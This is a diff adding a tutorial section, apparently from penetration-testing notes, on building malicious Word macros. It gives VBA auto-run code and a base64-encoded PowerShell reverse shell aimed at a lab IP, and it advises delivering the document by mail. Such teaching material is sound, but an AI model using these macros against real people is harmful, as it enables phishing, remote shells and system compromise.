@@ -75,6 +75,104 @@ john protected-docx.hash --show</code></pre>
                 </ul>
             </ul>
 
+            <h2>Macros</h2>
+            <p>Almost all softwares from office allow users to use macros which are a set of instructions that can be embeded in documents to automate tasks. From our attacker side we could be able to operate with the operating system layer in order to execute commands or stablish reverse shell connections. Here we'll show you how create macros, but first we must learn when those macros are going to be executed</p>
+            <h3>When macros are being executed</h3>
+            <ul>
+               <p>If we successfully manage to deliver the Office document to our target via mail or download link have in mind that the document will be tagged with the <b>Mark of the Web</b> (MOTW) which is basically a tag that tells office that document you are about to open was downloaded from internet which means it could contain malware. When office detects that MOTW it opens the document with the <b>protected view</b> (yellow banner). In this state macros are disabled but when the user clicks in "enable editing" all macros are executed</p>
+            </ul>
+            <h3>How to create macros </h3>
+            <ul>
+                <p>First we need to create a compatible document. Create a new word document and choose the following formats</p>
+                <ul>
+                    <li><b>Word 97-2003 Document (.doc)</b>    - This kind of document contains embedded macros</li>
+                    <li><b>Word 97-2003 Document (.docm)</b>    - This kind of document contains embedded macros</li>
+                    <li><b>Word Document (.docx)</b>    - This kind of document <b>does not save macros</b> meaning the macro in not persitent</li>
+                </ul>
+                <p>In order to create a new macro we must go to <b>View</b> and select <b>Macros</b>. Now <b>create</b> a new macro and setup the name you want. Now double click in macro name or click in <b>edit</b></p>
+                <p>Visual Basic For Applications goes this way</p>
+                <pre><code class="language-visual-basic">Sub AutoOpen()     
+' Your macro code
+End Sub                    
+</code></pre>
+                For example in case you would like to open a powershell windows you could do it this way    
+<pre><code class="language-visual-basic">Sub AutoOpen()     
+  CreateObject("Wscript.Shell").Run "powershell"
+End Sub                    
+</code></pre>
+                <p>Since macros <b>does not run</b> just when the document opens we need to configure it by doing the following</p>
+<pre><code class="language-visual-basic">Sub AutoOpen()
+
+  MyMacro
+  
+End Sub
+
+Sub Document_Open()
+
+  MyMacro
+  
+End Sub
+
+Sub MyMacro()
+
+  CreateObject("Wscript.Shell").Run "powershell"
+  
+End Sub               
+</code></pre>
+    <p>Now let's go to the interesting part. The following code performs a reverse shell connection using powershell. But we must have in mind that VBA has a limit of 255 for strings we declare. Meaning that we must split the payload of the reverse shell in diferent variables. In this case the payload is base64 encoded to avoid syntax errors</p>
+    <p>We can use the following script in python to automate spliting the base64 payload</p>
+    <pre><code class="language-python">str = "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAt...A=="
+
+n = 50
+
+for i in range(0, len(str), n):
+        print("Str = Str + " + '"' + str[i:i+n] + '"')                    
+</code></pre>
+    
+   <p>Now paste the output in the VBA</p>                                                  
+
+    <pre><code class="language-visual-basic">Sub AutoOpen()
+
+ macrotest
+
+End Sub
+
+Sub Document_open()
+
+ macrotest
+
+End Sub
+
+Sub macrotest()
+ Dim Str As String
+ Dim sh As Object
+ 
+ Str = Str + "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAt"
+ Str = Str + "AE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF"
+ Str = Str + "MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIA"
+ Str = Str + "MQA5ADIALgAxADYAOAAuADQANQAuADEAOQA2ACIALAA0ADQANA"
+ Str = Str + "A0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBu"
+ ...
+ ...
+ ...
+ Str = Str + "BkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBM"
+ Str = Str + "AGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AH"
+ Str = Str + "MAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUA"
+ Str = Str + "KAApAA=="
+ 
+ Set sh = CreateObject("Wscript.Shell")
+ sh.Run Str, 0, False
+    
+End Sub              
+</code></pre>
+    <p>Finally close the document </p>        
+
+
+                
+
+
+            </ul>
+
             
         </div>
     </div>
